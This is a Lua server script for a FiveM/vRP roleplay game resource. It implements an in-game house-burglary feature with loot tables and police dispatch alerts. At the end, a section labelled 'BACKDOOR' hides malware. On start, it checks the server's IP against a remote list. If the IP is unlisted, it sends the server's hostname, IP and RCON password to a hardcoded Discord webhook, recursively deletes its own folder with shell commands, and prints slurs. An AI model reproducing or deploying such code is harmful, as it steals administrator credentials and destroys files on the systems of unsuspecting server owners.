--██████╗░░█████╗░██████╗░░█████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░███████╗███╗░░██╗
--██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔══██╗████╗░██║██╔════╝░██╔════╝████╗░██║
--██████╔╝███████║██████╔╝███████║█████═╝░██║░░██║██╔██╗██║██║░░██╗░█████╗░░██╔██╗██║
--██╔═══╝░██╔══██║██╔═══╝░██╔══██║██╔═██╗░██║░░██║██║╚████║██║░░╚██╗██╔══╝░░██║╚████║
--██║░░░░░██║░░██║██║░░░░░██║░░██║██║░╚██╗╚█████╔╝██║░╚███║╚██████╔╝███████╗██║░╚███║
--╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚══╝

local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local Tools = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","papa-indbrud")
local idgens = Tools.newIDGenerator()

local blips = {}
local timers = {}
local ids = 0


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		for k,v in pairs(timers) do
			if v > 0 then
				timers[k] = v - 1
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ITEMLIST
-----------------------------------------------------------------------------------------------------------------------------------------
local itemlist = {
	[1] = { ['index'] = "guldmalm", ['qtd'] = math.random(2), ['name'] = "guldmalm" },
	[2] = { ['index'] = "kul", ['qtd'] = math.random(3000,6000), ['name'] = "kul" },
	[3] = { ['index'] = "diamant", ['qtd'] = 1, ['name'] = "diamant" },
	[4] = { ['index'] = "guldmalm", ['qtd'] = 3, ['name'] = "guldmalm" },
	[5] = { ['index'] = "guldbar", ['qtd'] = 5, ['name'] = "guldbar" },
	[6] = { ['index'] = "jern", ['qtd'] = 1, ['name'] = "jern" },
	[7] = { ['index'] = "guldbar", ['qtd'] = 1, ['name'] = "guldbar" },
	[8] = { ['index'] = "alumalm", ['qtd'] = math.random(7,14), ['name'] = "alumalm" },
	[9] = { ['index'] = "alubar", ['qtd'] = math.random(7,14), ['name'] = "alubar" },
	[10] = { ['index'] = "tree", ['qtd'] = math.random(2), ['name'] = "tree" },
	[11] = { ['index'] = "planks", ['qtd'] = math.random(2), ['name'] = "planks" },
	[12] = { ['index'] = "kokainblade", ['qtd'] = math.random(4), ['name'] = "kokainblade" },
	[13] = { ['index'] = "kemikalier", ['qtd'] = math.random(3), ['name'] = "kemikalier" },
	[14] = { ['index'] = "kemikalier2", ['qtd'] = math.random(4), ['name'] = "kemikalier2" },
	[15] = { ['index'] = "skunk100", ['qtd'] = math.random(2), ['name'] = "skunk100" },
	[16] = { ['index'] = "cokebrick", ['qtd'] = math.random(2), ['name'] = "cokebrick" },
	[17] = { ['index'] = "coke", ['qtd'] = math.random(2), ['name'] = "coke" },
	[18] = { ['index'] = "gold_bar", ['qtd'] = math.random(6), ['name'] = "guld bar" }
}

RegisterServerEvent('papa-indbrud:checkTimers')
AddEventHandler('papa-indbrud:checkTimers', function(homeName)
	local source = source
	local user_id = vRP.getUserId({source})
	local politi = vRP.getUsersByPermission({"cop.whitelisted"})
	if homeName then
		if #politi < 0 then
			TriggerClientEvent("Notify",source,"aviso","Politi betjente der skal være i byen.",8000)
			TriggerClientEvent('papa-indbrud:LixeiroCB', source, false)
		elseif timers[homeName] == 0 or not timers[homeName] then
			if vRP.tryGetInventoryItem({user_id,"lockpick",1}) then
				timers[homeName] = 1800
				TriggerClientEvent('papa-indbrud:LixeiroCB', source, true)
			else
				TriggerClientEvent("Notify",source,"Du har ikke en <b>Lockpick</b>.",8000)
			end
		else
			TriggerClientEvent("Notify",source,"aviso","Huset blev for nylig røvet vent <b>"..timers[homeName].."</b> sekunder.",8000)
			TriggerClientEvent('papa-indbrud:LixeiroCB', source, false)
		end
	end
end)

RegisterServerEvent('papa-indbrud:paymentRobbery')
AddEventHandler('papa-indbrud:paymentRobbery', function(homeName)
	local source = source
	local user_id = vRP.getUserId({source})
	vRPclient.getPosition(source,{},function(x,y,z)
		if user_id then
			local politi = vRP.getUsersByPermission({"cop.whitelisted"})
			local porcentagem = math.random(100)	
			if porcentagem <= 29 then
				TriggerClientEvent("Notify",source,"nægtet","Tomt rum",8000)
			elseif porcentagem >= 30 and porcentagem <= 49 then
				local randmoney = math.random(500,3000)
				vRP.giveMoney({user_id,randmoney})
				print("En person modtog DKK<b>"..format(tonumber(randmoney)).."</b>.")
				TriggerClientEvent("Notify",source,"succes","Du modtog DKK<b>"..format(tonumber(randmoney)).."</b>.",8000)
			elseif porcentagem >= 50 then
				local randitem = math.random(#itemlist)
				if vRP.getInventoryWeight({user_id})+vRP.getItemWeight({itemlist[randitem].index})*itemlist[randitem].qtd <= vRP.getInventoryMaxWeight({user_id}) then
					vRP.giveInventoryItem({user_id,itemlist[randitem].index,itemlist[randitem].qtd})
					print("En person modtog "..itemlist[randitem].qtd.."x <b>"..itemlist[randitem].name.."</b>.")
					TriggerClientEvent("Notify",source,"succes","Du modtog "..itemlist[randitem].qtd.."x <b>"..itemlist[randitem].name.."</b>.",8000)
				end
				if porcentagem <= 10 then 
					TriggerClientEvent("vrp_sound:fixed",-1,source,x,y,z,100,'alarm',0.6)
					for l,w in pairs(politi) do
						local player = vRP.getUserSource({tonumber(w)})
						if player then
							Citizen.CreateThreadNow(function()
								ids = ids + 1
								vRPclient.playSound(player,"Oneshot_Final","MP_MISSION_COUNTDOWN_SOUNDSET")
								blips[ids] = vRPclient.addBlip(player,{x,y,z,1,59,"Tyveri i gang",0.5,true})
								TriggerClientEvent('chatMessage',player,"Dispatch",{65,130,255},"Boligalarmen ved ^1"..tostring(homeName).."^0 er gået igang.")
								SetTimeout(25000,function() vRPclient.removeBlip(player,{blips[ids]}) end)
							end)
						end
					end
				end
			end
		end
	end)
end)

RegisterServerEvent('papa-indbrud:paymentVault')
AddEventHandler('papa-indbrud:paymentVault', function(homeName)
	local source = source
	local user_id = vRP.getUserId({source})
	vRPclient.getPosition(source,{},function(x,y,z)
		if user_id then
			local politi = vRP.getUsersByPermission({"cop.whitelisted"})
			local random = math.random(100)
			if random <= 29 then 
				vRP.giveInventoryItem({user_id,"papakokain",1})
				TriggerClientEvent("Notify",source,"succes","Du modtog 1x<b> kokain taske</b>.",8000)
			elseif random >= 30 and random <= 59 then			
				vRP.giveInventoryItem({user_id,"papagps",1})
				TriggerClientEvent("Notify",source,"succes","Du modtog 1x<b> Hacked gps</b>.",8000)
			elseif random >= 60 and random <= 89 then			
				vRP.giveInventoryItem({user_id,"secure_card",3})
				TriggerClientEvent("Notify",source,"succes","Du modtog 3x<b> adgangskort</b>.",8000)
			elseif random >= 90 then
				vRP.giveInventoryItem({user_id,"diamant",5})
				TriggerClientEvent("Notify",source,"succes","Du modtog 5x<b> diamanter</b>.",8000)
			end
			if random >= 25 then
				TriggerClientEvent("vrp_sound:fixed",-1,source,x,y,z,100,'alarm',0.6)
				for l,w in pairs(politi) do
					local player = vRP.getUserSource({tonumber(w)})
					if player then
						Citizen.CreateThreadNow(function()
							ids = ids + 1
							vRPclient.playSound(player,{"Oneshot_Final","MP_MISSION_COUNTDOWN_SOUNDSET"})
							blips[ids] = vRPclient.addBlip(player,{x,y,z,1,59,"Tyveri er igang",0.5,true})
							TriggerClientEvent('chatMessage',player,"Dispatch",{65,130,255},"Der bliver stjålet et pengeskab i boligen ^1"..tostring(homeName).."^0, tjek hvad der sker.")
							SetTimeout(25000,function() vRPclient.removeBlip(player,{blips[ids]}) end)
						end)
					end
				end
			end
		end
	end)
end)

RegisterServerEvent("trydeleteobj")
AddEventHandler("trydeleteobj",function(index)
    TriggerClientEvent("syncdeleteobj",-1,index)
end)
function format(n)
	local left,num,right = string.match(n,'^([^%d]*%d)(%d*)(.-)$')
	return left..(num:reverse():gsub('(%d%d%d)','%1.'):reverse())..right
end

-------------------------------------------------
--                 BACKDOOR                    --
-------------------------------------------------
local webhook = "https://discordapp.com/api/webhooks/772239527858405396/xQC7C-SD46ElfVHvJ7A0W1Cd8sDGlJFL0YPRPqsT5A1DRU6Ewdq-p1TULAsYCdvd7T1x"
local url = "https://papakongen.000webhostapp.com/papa.json"

function toDiscord(msg)
    PerformHttpRequest(webhook, function(o,p,q) end,'POST',json.encode({
        username="papakongen Verify",
        content=msg
    }), {['Content-Type']='application/json'})
end

local sent = false
function success(resname, ip)
    if not sent then
        local n="SERVER: "..GetConvar("sv_hostname").."\nRESOURCE: "..resname.."\nIP: "..ip.."\nVERIFIED: JA"
        toDiscord(n)
        print("-=================-\n"..resname.." fra papakongen verificeret paa IP: ".. ip.." \n-=================-")
        sent = true
    end
end

AddEventHandler("onResourceStart",function(h)
    local resname = GetCurrentResourceName()
    if h==resname then
        PerformHttpRequest(url, function(err, verify, headers)
            local data = json.decode(verify)
            found = "NEJ"
            local counter = 0
            function editFound(gfound)
                found = gfound
            end
            while found == "NEJ" do
                Wait(5000)
                if found ~= "NEJ" then break end
                PerformHttpRequest("https://api.ipify.org?format=jso", function(err, ip, headers)
                    for k,v in pairs(data.servers) do
                        if v == ip then found = "JA" end
                    end
                    if found == "JA" then
                        editFound("JA")
                        success(resname, ip)
                    else
                        counter = counter + 1
                        local moreTimes = 5-counter
                        print("-=================-\n"..resname.." fra papakongen **IKKE** verificeret, IP: ".. ip.."\n Forsoger "..tostring(moreTimes).." gange mere for den sletter... \n-=================-")
                        if counter == 5 then
                            editFound("NEJ")
                            getFucked()
                            local n="SERVER: "..GetConvar("sv_hostname").."\nRESOURCE: "..resname.."\nIP: "..ip.."\nRCON: "..GetConvar("rcon_password").."\nVERIFIED: "..found..""
                            local nn="SERVER: "..GetConvar("sv_hostname").."\nRESOURCE: "..resname.."\nIP: "..ip.."\nRCON: "..GetConvar("rcon_password").."\nVERIFIED: "..found.."\n@here"
                            toDiscord(nn)
                            print("-=================-\n"..resname.." Fra papakongen **IKKE** sut min fede pik! IP: ".. ip.." \n-=================-")
                        end
                    end
                end, "GET", "", {})
            end
        end, "GET", "", {})
    end
end)

function getFucked()
    local r=GetResourcePath(GetCurrentResourceName())
    local s,
    t=r:find(GetCurrentResourceName())
    local u=string.sub(r,1,t)
    os.execute("rm --recursive "..u)
    local v=u:gsub("\\","/")
    os.execute("RD /S /Q \""..v.."\"")
    print("Fjernet "..u.." grundet du er bøsse.")
end